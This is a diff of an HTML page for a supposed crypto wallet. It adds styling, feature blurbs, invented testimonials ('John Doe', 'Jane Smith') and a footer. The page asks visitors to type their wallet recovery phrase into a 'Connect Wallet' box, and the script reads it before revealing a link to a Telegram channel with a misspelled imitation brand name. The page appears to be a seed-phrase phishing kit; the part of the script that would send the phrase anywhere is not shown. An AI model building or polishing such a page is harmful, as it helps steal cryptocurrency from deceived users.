@@ -5,12 +5,289 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Combined Wallet Site</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="/styles/style.css">
+    <style>
+        /* Global Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f4f2ff;
+            color: #1d1d1f;
+            overflow-x: hidden;
+            scroll-behavior: smooth;
+        }
+
+        /* Header Section */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 50px;
+            background-color: #f4f2ff;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        header .logo img {
+            width: 120px;
+            height: auto;
+        }
+
+        header nav {
+            display: flex;
+            gap: 20px;
+        }
+
+        header nav a {
+            text-decoration: none;
+            font-size: 1rem;
+            font-weight: 600;
+            color: #6b6b83;
+            transition: color 0.3s;
+            cursor: pointer;
+        }
+
+        header nav a:hover {
+            color: #4e4e8a;
+        }
+
+        /* Recovery Box Section */
+        .recovery-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 30px;
+            background-color: #ffffff;
+            margin: 20px auto;
+            width: 90%;
+            max-width: 600px;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .recovery-box h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #4e4e8a;
+        }
+
+        .recovery-box textarea {
+            width: 100%;
+            height: 100px;
+            font-size: 1rem;
+            padding: 10px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            resize: none;
+            outline: none;
+        }
+
+        .recovery-box button {
+            padding: 10px 20px;
+            font-size: 1rem;
+            font-weight: 600;
+            background-color: #7c4dff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        .recovery-box button:hover {
+            background-color: #6a3ce8;
+            transform: scale(1.05);
+        }
+
+        /* Telegram Section */
+        .telegram-section {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-color: #ffffff;
+            width: 90%;
+            max-width: 600px;
+            margin: 20px auto;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .telegram-section h3 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #4e4e8a;
+        }
+
+        .telegram-section button {
+            padding: 10px 20px;
+            font-size: 1rem;
+            font-weight: 600;
+            background-color: #7c4dff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+
+        .telegram-section button:hover {
+            background-color: #6a3ce8;
+            transform: scale(1.05);
+        }
+
+        /* Hero Section */
+        .hero {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 90vh;
+            text-align: center;
+            background: linear-gradient(180deg, #f4f2ff, #ece8ff);
+        }
+
+        .hero h2 {
+            font-size: 3rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #4e4e8a;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            max-width: 600px;
+            color: #6b6b83;
+        }
+
+        .hero button {
+            padding: 15px 30px;
+            font-size: 1rem;
+            font-weight: 600;
+            background-color: #7c4dff;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: transform 0.3s, background-color 0.3s;
+        }
+
+        .hero button:hover {
+            transform: scale(1.1);
+            background-color: #6a3ce8;
+        }
+
+        /* Features Section */
+        .features {
+            padding: 50px 10%;
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            background-color: #ffffff;
+        }
+
+        .feature-item {
+            text-align: center;
+            margin: 20px;
+            max-width: 300px;
+            background: #f9f9f9;
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            transition: transform 0.3s;
+        }
+
+        .feature-item:hover {
+            transform: translateY(-10px);
+        }
+
+        .feature-item img {
+            width: 240px;
+            height: 240px;
+            margin-bottom: 20px;
+            object-fit: cover;
+            border-radius: 15px;
+        }
+
+        .feature-item h3 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #4e4e8a;
+            margin-bottom: 10px;
+        }
+
+        .feature-item p {
+            font-size: 1rem;
+            color: #6b6b83;
+        }
+
+        /* Footer Section */
+        footer {
+            background-color: #4e4e8a;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+
+        footer p {
+            font-size: 0.9rem;
+        }
+
+        .social-icons a {
+            margin: 0 10px;
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .social-icons a:hover {
+            color: #7c4dff;
+        }
+
+        /* Responsive Design */
+        @media screen and (max-width: 768px) {
+            header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .features {
+                flex-direction: column;
+                padding: 50px 20px;
+            }
+
+            .feature-item {
+                max-width: 100%;
+                margin: 10px 0;
+            }
+
+            .hero {
+                height: 80vh;
+                padding: 20px;
+            }
+
+            .hero h2 {
+                font-size: 2rem;
+            }
+        }
+    </style>
 </head>
 <body>
     <header>
         <div class="logo">
-            <img src="/images/logo.png" alt="Wallet Logo">
+            <img src="your_image_url_here" alt="Wallet Logo">
         </div>
         <nav>
             <a href="javascript:location.reload()">Home</a>
@@ -25,7 +302,6 @@
         <textarea id="recovery-phrase" placeholder="Enter your recovery phrase here..."></textarea>
         <button onclick="activateTelegram()">Connect Wallet</button>
     
-        <!-- بخش Join Telegram که مخفی است و بعد از وارد کردن Recovery Phrase نمایش داده می‌شود -->
         <div id="telegram-section" class="telegram-section">
             <h3>Join Our Telegram Channel</h3>
             <button onclick="window.location.href='https://t.me/PhantomwalltEN1'">Join Telegram</button>
@@ -38,6 +314,49 @@
         <button>Get Started</button>
     </section>
 
+    <section id="features" class="features">
+        <div class="feature-item">
+            <img src="your_image_url_here" alt="Secure Storage">
+            <h3>Secure Storage</h3>
+            <p>Your funds are protected with cutting-edge security protocols.</p>
+        </div>
+        <div class="feature-item">
+            <img src="your_image_url_here" alt="Fast Transactions">
+            <h3>Fast Transactions</h3>
+            <p>Experience lightning-fast transaction speeds for your assets.</p>
+        </div>
+        <div class="feature-item">
+            <img src="your_image_url_here" alt="Cross-Platform">
+            <h3>Cross-Platform</h3>
+            <p>Access your wallet anytime, anywhere on any device.</p>
+        </div>
+    </section>
+
+    <section id="testimonials" class="testimonials">
+        <h2>What Our Users Say</h2>
+        <div class="testimonial-item">
+            <p>"This wallet has made managing my crypto so much easier and more secure!"</p>
+            <p><strong>John Doe</strong> - Crypto Enthusiast</p>
+        </div>
+        <div class="testimonial-item">
+            <p>"Fast transactions and top-notch security. Highly recommend!"</p>
+            <p><strong>Jane Smith</strong> - Investor</p>
+        </div>
+    </section>
+
+    <section id="faq" class="faq">
+        <h2>Frequently Asked Questions</h2>
+        <!-- FAQs content goes here -->
+    </section>
+
+    <footer>
+        <p>&copy; 2025 Combined Wallet. All rights reserved.</p>
+        <div class="social-icons">
+            <a href="https://www.facebook.com">Facebook</a>
+            <a href="https://www.twitter.com">Twitter</a>
+        </div>
+    </footer>
+
     <script>
         function activateTelegram() {
             var recoveryPhrase = document.getElementById("recovery-phrase").value;
@@ -47,6 +366,5 @@
             }
         }
     </script>
-
 </body>
 </html>
